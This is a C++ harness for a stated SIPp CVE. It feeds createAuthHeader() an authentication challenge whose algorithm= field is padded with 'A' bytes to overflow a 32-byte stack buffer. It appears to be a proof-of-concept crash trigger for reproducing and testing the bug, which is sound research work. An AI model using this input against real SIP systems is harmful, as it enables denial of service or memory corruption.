/*
 * Direct-call harness for CVE-2026-90779: SIPp createAuthHeader() copies an
 * attacker-supplied 401/407 WWW-/Proxy-Authenticate algorithm= value into
 * char algo[32] with strncpy() bounded by the source length.  argv[1] is the
 * number of 'A' bytes in the challenge; 64 overflows the stack buffer.
 */
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>

#include "auth.hpp"

int main(int argc, char **argv)
{
    size_t n = (argc > 1) ? strtoul(argv[1], nullptr, 10) : 64;
    if (n == 0 || n > 4096)
        return 2;

    std::string auth = "Digest realm=\"lab\", nonce=\"abc\", algorithm=";
    auth.append(n, 'A');
    auth += ", qop=auth";

    char result[512] = {0};
    int rc = createAuthHeader("alice", "secret", "INVITE",
                              "sip:alice@127.0.0.1", nullptr,
                              auth.c_str(), nullptr, nullptr, nullptr,
                              1, result, sizeof(result));
    printf("createAuthHeader rc=%d result=%.64s\n", rc, result);
    fflush(stdout);
    return 0;
}
